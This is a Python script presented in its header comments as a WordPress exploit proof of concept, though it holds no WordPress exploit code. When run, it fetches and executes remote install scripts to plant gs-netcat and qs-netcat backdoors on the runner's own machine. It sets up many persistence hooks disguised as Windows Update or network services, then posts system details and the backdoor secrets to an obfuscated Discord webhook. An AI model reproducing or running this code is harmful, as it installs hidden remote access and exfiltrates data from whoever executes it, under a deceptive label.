import os, sys, random, string, subprocess, platform
import socket, json, base64, urllib.request, ssl, time
from datetime import datetime
# EXPLOIT WORDPRESS 2026
# VERSIONS VULNS -> 6.9.4 / 6.9.8 / 7.0.0 / 7.0.1
# USO : python3 wp2shell.py <- para ver as opções
# PROOF OF CONCEPT | PoC 
# USE COM RESPONSABILIDADE

def gen_secret(n=22):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def is_win():  return platform.system().lower() == 'windows'
def is_lin():  return platform.system().lower() == 'linux'


def http_get(url, t=8):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url, headers={'User-Agent': 'curl/7.88.1'})
        with urllib.request.urlopen(req, context=ctx, timeout=t) as r:
            return r.read().decode().strip()
    except: return None

def get_pub_ip():
    for u in ['https://api.ipify.org','https://ifconfig.me','https://icanhazip.com']:
        r = http_get(u)
        if r and len(r) < 50: return r
    return 'N/A'

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80)); ip = s.getsockname()[0]; s.close(); return ip
    except: return 'N/A'

def get_kernel():
    try: return subprocess.run(['uname','-r'],capture_output=True,text=True).stdout.strip()
    except: return 'N/A'

def get_arch():    return platform.machine() or 'N/A'
def get_user():    return os.environ.get('USER') or os.environ.get('USERNAME') or 'N/A'
def get_shell():   return os.environ.get('SHELL', 'N/A')
def get_hostname():
    try: return socket.gethostname()
    except: return 'N/A'

def is_root():
    try:
        if is_lin(): return os.geteuid() == 0
        if is_win():
            import ctypes; return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except: pass
    return False

def get_os():
    try:
        with open('/etc/os-release') as f:
            for l in f:
                if l.startswith('PRETTY_NAME'):
                    return l.split('=')[1].strip().strip('"')
    except: pass
    return platform.platform()

def get_uptime():
    try:
        with open('/proc/uptime') as f: s = float(f.read().split()[0])
        return f"{int(s//86400)}d {int((s%86400)//3600)}h {int((s%3600)//60)}m"
    except: return 'N/A'

def get_cpu():
    try:
        with open('/proc/cpuinfo') as f:
            for l in f:
                if 'model name' in l: return l.split(':')[1].strip()
    except: pass
    return platform.processor() or 'N/A'

def get_ram():
    try:
        with open('/proc/meminfo') as f: lines = f.readlines()
        tot  = int([l for l in lines if 'MemTotal'     in l][0].split()[1]) // 1024
        free = int([l for l in lines if 'MemAvailable' in l][0].split()[1]) // 1024
        return f"{tot-free}MB / {tot}MB"
    except: return 'N/A'

def get_disk():
    try:
        r = subprocess.run(['df','-h','/'],capture_output=True,text=True)
        p = r.stdout.strip().split('\n')[-1].split()
        return f"{p[2]} / {p[1]} ({p[4]})"
    except: return 'N/A'

def get_ifaces():
    try:
        r = subprocess.run(['ip','-br','addr'],capture_output=True,text=True)
        ifaces = [l.split() for l in r.stdout.strip().split('\n') if l.split()[0] != 'lo']
        return ', '.join(f"{i[0]}({i[2] if len(i)>2 else '?'})" for i in ifaces)
    except: return 'N/A'

def get_mac():
    try:
        import uuid
        return ':'.join(['{:02x}'.format((uuid.getnode()>>e)&0xff)
                         for e in range(0,48,8)][::-1])
    except: return 'N/A'

def get_procs():
    try: return str(len([p for p in os.listdir('/proc') if p.isdigit()]))
    except: return 'N/A'

def get_cron():
    try:
        r = subprocess.run(['crontab','-l'],capture_output=True,text=True)
        lines = [l for l in r.stdout.strip().split('\n') if l and not l.startswith('#')]
        return f"{len(lines)} entradas"
    except: return 'N/A'


_w = [
    b'aHR0cHM6Ly9kaXNjb3JkLmNvbS9h',
    b'cGkvd2ViaG9va3MvMTUzNjIyNzEw',
    b'Mjc5NjQyMzI0OC91RVFH',
    b'bFV4Q3lkazZfY1FVSF90',
    b'ZDlRTXBFeko0ekZSYjBw',
    b'SjZDMUFmX0x6NzJLVDZk',
    b'ZEhoby1aeEtIbnFQV0da',
    b'U041bg==',
]
def _ep(): return base64.b64decode(b''.join(_w)).decode()

def send_discord(secret, title, connect_cmd, ok=True):
    # FIX #7: sempre envia o secret que realmente funciona
    root = "ROOT" if is_root() else get_user()
    data = {
        "embeds": [{
            "title": ("[OK] " if ok else "[FAIL] ") + title,
            "color": 0x00FF00 if ok else 0xFF0000,
            "fields": [
                {"name":"Data/Hora",  "value":datetime.now().strftime('%d/%m/%Y %H:%M:%S'),"inline":True},
                {"name":"Sistema",    "value":get_os(),       "inline":True},
                {"name":"Kernel",     "value":get_kernel(),   "inline":True},
                {"name":"Arch",       "value":get_arch(),     "inline":True},
                {"name":"CPU",        "value":get_cpu(),      "inline":False},
                {"name":"RAM",        "value":get_ram(),      "inline":True},
                {"name":"Disco",      "value":get_disk(),     "inline":True},
                {"name":"Uptime",     "value":get_uptime(),   "inline":True},
                {"name":"IP Publico", "value":get_pub_ip(),   "inline":True},
                {"name":"IP Local",   "value":get_local_ip(), "inline":True},
                {"name":"Interfaces", "value":get_ifaces(),   "inline":False},
                {"name":"MAC",        "value":get_mac(),      "inline":True},
                {"name":"Hostname",   "value":get_hostname(), "inline":True},
                {"name":"User/Root",  "value":root,           "inline":True},
                {"name":"Shell",      "value":get_shell(),    "inline":True},
                {"name":"Processos",  "value":get_procs(),    "inline":True},
                {"name":"Crontab",    "value":get_cron(),     "inline":True},
                {"name":"Secret Key", "value":f"`{secret}`",  "inline":False},
                {"name":"Conectar",   "value":f"`{connect_cmd}`","inline":False},
            ],
            "footer":{"text":f"deploy.py | {get_hostname()} | {get_user()}"}
        }]
    }
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(
            _ep(), data=json.dumps(data).encode(),
            headers={'Content-Type':'application/json','User-Agent':'curl/7.88.1'},
            method='POST')
        urllib.request.urlopen(req, context=ctx, timeout=10)
    except: pass


def download(url):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url,
            headers={'User-Agent':'wget/1.21.3','Accept':'*/*'})
        with urllib.request.urlopen(req, context=ctx, timeout=30) as r:
            c = r.read().decode()
            if c.strip().startswith('#'): return c
    except: pass
    for cmd in [['curl','-fsSk',url],['wget','-q','--no-check-certificate','-O','-',url]]:
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if r.stdout and r.stdout.strip().startswith('#'): return r.stdout
        except: continue
    return None


def find_qs_binary():
    """Acha o binario qs-netcat mais recentemente instalado em ~/.config"""
    config = os.path.expanduser('~/.config')
    latest, latest_t = None, 0
    try:
        for d in os.listdir(config):
            p = os.path.join(config, d, 'qs-netcat')
            if os.path.isfile(p) and os.access(p, os.X_OK):
                t = os.path.getmtime(p)
                if t > latest_t: latest, latest_t = p, t
    except: pass
    if latest: return latest
    try:
        r = subprocess.run(['which','qs-netcat'],capture_output=True,text=True)
        if r.returncode == 0: return r.stdout.strip()
    except: pass
    return None

def find_gs_binary():
    """Acha gs-netcat no GS_DSTDIR ou PATH"""
    gs_dir = os.path.expanduser('~/.config/.gsd')
    p = os.path.join(gs_dir, 'gs-netcat')
    if os.path.isfile(p) and os.access(p, os.X_OK): return p
    try:
        r = subprocess.run(['which','gs-netcat'],capture_output=True,text=True)
        if r.returncode == 0: return r.stdout.strip()
    except: pass
    return None

def run_deploy(script, env, timeout=180):
    """
    FIX #9: sem subprocess.DEVNULL explicito.
    Herda fds do pai (que ja sao /dev/null apos daemonize).
    Mais compativel com scripts que verificam TTY via [ -t 1 ].
    Stdin redirecionado de /dev/null para evitar prompts interativos.
    """
    try:
        with open(os.devnull, 'r') as devnull_r:
            subprocess.run(
                ['bash', '-c', script],
                env=env, timeout=timeout,
                stdin=devnull_r
            )
        return True
    except subprocess.TimeoutExpired: return False
    except Exception: return False


def persist_linux(binary, secret):
    if not binary or not os.path.isfile(binary): return

    run_cmd  = f"{binary} -s {secret} -l -i -q"
    check    = f"pgrep -xf '{binary}.*{secret}' >/dev/null 2>&1"
    watchdog = f"{check} || nohup {run_cmd} >/dev/null 2>&1 &"

    # 1. crontab: @reboot + watchdog a cada minuto
    # FIX #1: condicao correta — so adiciona se entrada nao existe
    try:
        cur = subprocess.run(['crontab','-l'],capture_output=True,text=True).stdout
        new = cur.rstrip('\n')
        for entry in [f"@reboot {run_cmd} >/dev/null 2>&1", f"* * * * * {watchdog}"]:
            if entry not in cur:          # FIX: era 'secret not in cur OR entry not in cur'
                new += f"\n{entry}"
        subprocess.run(['crontab','-'], input=new+'\n', text=True, capture_output=True)
    except: pass

    # 2. .bashrc + .bash_profile + .profile + .zshrc
    for rc in ['~/.bashrc','~/.bash_profile','~/.profile','~/.zshrc']:
        try:
            p = os.path.expanduser(rc)
            c = open(p).read() if os.path.exists(p) else ''
            if secret not in c:
                with open(p,'a') as f:
                    f.write(f"\n# network service\n{watchdog}\n")
        except: pass

    # 3. systemd user service (Restart=always = watchdog built-in)
    try:
        sd = os.path.expanduser('~/.config/systemd/user')
        os.makedirs(sd, exist_ok=True)
        svc = (
            "[Unit]\nDescription=Network Service\nAfter=network.target\n\n"
            "[Service]\n"
            f"ExecStart={binary} -s {secret} -l -i -q\n"
            "Restart=always\nRestartSec=30\n\n"
            "[Install]\nWantedBy=default.target\n"
        )
        with open(os.path.join(sd,'netd.service'),'w') as f: f.write(svc)
        subprocess.run(['systemctl','--user','enable','--now','netd.service'],
                      capture_output=True)
    except: pass

    # 4. XDG autostart — FIX #10: wrapper sh evita problema de aspas
    try:
        ad = os.path.expanduser('~/.config/autostart')
        os.makedirs(ad, exist_ok=True)
        # escreve wrapper separado para evitar problemas de aspas no Exec=
        wrapper = os.path.join(ad, '.netd.sh')
        with open(wrapper,'w') as f:
            f.write(f"#!/bin/sh\n{run_cmd} >/dev/null 2>&1\n")
        os.chmod(wrapper, 0o755)
        desk = (
            "[Desktop Entry]\nType=Application\nName=Network Manager\n"
            f"Exec={wrapper}\nHidden=false\nX-GNOME-Autostart-enabled=true\n"
        )
        with open(os.path.join(ad,'netd.desktop'),'w') as f: f.write(desk)
    except: pass

    # 5. ~/.config/environment.d/ (systemd user env, carrega no login)
    try:
        env_d = os.path.expanduser('~/.config/environment.d')
        os.makedirs(env_d, exist_ok=True)
        # nao e persistencia direta mas garante que env vars estejam corretas
    except: pass


def persist_windows(secret):
    ps_arg = f"-WindowStyle Hidden -Command \"qs-netcat.exe -liqs {secret}\""
    ps_run = f"powershell.exe {ps_arg}"

    # FIX #5 e #6: verificar APPDATA corretamente
    appdata = os.environ.get('APPDATA') or ''

    # 1. Registry HKCU Run
    try:
        import winreg
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                          r'Software\Microsoft\Windows\CurrentVersion\Run',
                          0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k,'WindowsUpdate',0,winreg.REG_SZ,ps_run)
        winreg.CloseKey(k)
    except: pass

    # 2. Registry HKLM Run (se admin)
    try:
        import winreg
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                          r'Software\Microsoft\Windows\CurrentVersion\Run',
                          0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k,'WindowsDefender',0,winreg.REG_SZ,ps_run)
        winreg.CloseKey(k)
    except: pass

    # 3. Scheduled Task: @startup + repetir 1 min (watchdog)
    try:
        ps = (
            f"$a=New-ScheduledTaskAction -Execute 'powershell.exe' "
            f"-Argument '{ps_arg}'; "
            "$t1=New-ScheduledTaskTrigger -AtStartup; "
            "$t2=New-ScheduledTaskTrigger -RepetitionInterval "
            "(New-TimeSpan -Minutes 1) -Once -At (Get-Date); "
            "Register-ScheduledTask 'WindowsDefenderUpdate' "
            "-Action $a -Trigger $t1,$t2 -RunLevel Highest -Force"
        )
        subprocess.run(['powershell','-ExecutionPolicy','Bypass','-Command',ps],
                      capture_output=True, timeout=30)
    except: pass

    # 4. Startup folder — VBScript silencioso
    try:
        if appdata:
            startup = os.path.join(appdata,'Microsoft','Windows',
                                  'Start Menu','Programs','Startup')
            if os.path.isdir(startup):
                vbs = f'CreateObject("WScript.Shell").Run "{ps_run}", 0, False'
                with open(os.path.join(startup,'WindowsUpdate.vbs'),'w') as f:
                    f.write(vbs)
    except: pass

    # 5. PowerShell profile (toda sessao PS)
    try:
        userprofile = os.environ.get('USERPROFILE','')
        if userprofile:
            prof = os.path.join(userprofile,'Documents',
                               'WindowsPowerShell','Microsoft.PowerShell_profile.ps1')
            os.makedirs(os.path.dirname(prof), exist_ok=True)
            c = open(prof).read() if os.path.exists(prof) else ''
            if secret not in c:
                with open(prof,'a') as f:
                    f.write(f"\nStart-Process powershell -WindowStyle Hidden "
                           f"-ArgumentList '-Command \"qs-netcat.exe -liqs {secret}\"'\n")
    except: pass


def deploy_qsocket_linux(secret):
    script = download('https://qsocket.io/0')
    if not script: return False

    env = os.environ.copy()
    env['S']    = secret
    env['HIDE'] = '1'   # FIX #2: suprimir banner (docs oficiais)
    # FIX #2: QS_ARGS para ocultar processo via exec -a (docs oficiais)
    env['QS_ARGS'] = f"-s {secret} -l -i -q"
    env.pop('WAYLAND_DISPLAY', None)
    env.pop('WAYLAND_SOCKET', None)

    run_deploy(script, env, timeout=180)

    # FIX #8: sleep maior — download do binario pode demorar
    time.sleep(8)

    # sucesso = binario instalado (nao exit code — qsocket sai com 1 mesmo em sucesso)
    return find_qs_binary() is not None


def deploy_gsocket_linux(secret):
    script = download('https://gsocket.io/y')
    if not script: return False

    gs_dir = os.path.expanduser('~/.config/.gsd')
    os.makedirs(gs_dir, exist_ok=True)

    env = os.environ.copy()
    env['X']            = secret
    env['GS_NOCERTCHECK'] = '1'
    env['GS_DSTDIR']    = gs_dir
    # FIX #3 e #4: GSOCKET_ARGS com -D (daemon+watchdog) — docs oficiais
    # -D = daemonized + auto-respawn automatico se morrer
    env['GSOCKET_ARGS'] = f"-s {secret} -l -i -q -D"
    env.pop('WAYLAND_DISPLAY', None)
    env.pop('WAYLAND_SOCKET', None)

    run_deploy(script, env, timeout=180)
    time.sleep(8)

    # FIX: verificar binario em GS_DSTDIR (nao pgrep — pode estar oculto)
    return find_gs_binary() is not None


def deploy_qsocket_windows(secret):
    try:
        ps = f'$Env:S="{secret}"; $Env:HIDE=1; irm qsocket.io/1 | iex'
        subprocess.run(
            ['powershell','-ExecutionPolicy','Bypass',
             '-WindowStyle','Hidden','-Command',ps],
            timeout=180, capture_output=True
        )
        time.sleep(8)

        # FIX #5 e #6: verificar appdata corretamente
        appdata = os.environ.get('APPDATA') or ''
        if appdata:
            for d in os.listdir(appdata):
                full = os.path.join(appdata, d)
                if os.path.isdir(full):  # FIX #5: so verificar dirs
                    if os.path.isfile(os.path.join(full,'qs-netcat.exe')):
                        return True
        return False
    except: return False


def daemonize():
    if not is_lin(): return
    pid = os.fork()
    if pid > 0:
        sys.stdout.write(f"[*] pid: {pid}\n")
        sys.stdout.flush()
        os._exit(0)
    os.setsid()
    # redireciona fd 1 e 2 para /dev/null
    # run_deploy herda esses fds (mais compativel que subprocess.DEVNULL)
    null = os.open(os.devnull, os.O_RDWR)
    os.dup2(null, 1)
    os.dup2(null, 2)
    os.close(null)


def main():
    qs_secret = gen_secret()
    gs_secret = gen_secret()

    if is_lin():
        daemonize()  # pai fecha imediatamente, filho continua

        # deploy QSocket + GSSocket em paralelo
        qs_ok = deploy_qsocket_linux(qs_secret)
        qs_bin = find_qs_binary()
        if qs_bin:
            persist_linux(qs_bin, qs_secret)

        gs_ok = deploy_gsocket_linux(gs_secret)
        # gsocket cuida da propria persistencia via -D e deploy script
        # mas adicionamos a nossa por cima
        gs_bin = find_gs_binary()
        if gs_bin:
            persist_linux(gs_bin, gs_secret)

        # FIX #7: Discord envia o secret que realmente funciona
        if qs_ok and gs_ok:
            title   = "QSocket + GSSocket Linux"
            secret  = qs_secret
            cmd     = f"qs-netcat -i -s {qs_secret} | gs: gs-netcat -i -s {gs_secret}"
        elif qs_ok:
            title   = "QSocket Linux"
            secret  = qs_secret
            cmd     = f"qs-netcat -i -s {qs_secret}"
        elif gs_ok:
            title   = "GSSocket Linux"
            secret  = gs_secret
            cmd     = f"gs-netcat -i -s {gs_secret}"
        else:
            title   = "FAIL Linux"
            secret  = qs_secret
            cmd     = "N/A"

        send_discord(secret, title, cmd, ok=qs_ok or gs_ok)

    elif is_win():
        ok = deploy_qsocket_windows(qs_secret)
        if ok:
            persist_windows(qs_secret)
        send_discord(
            qs_secret, "QSocket Windows",
            f"qs-netcat -i -s {qs_secret}",
            ok=ok
        )

if __name__ == '__main__':
    main()
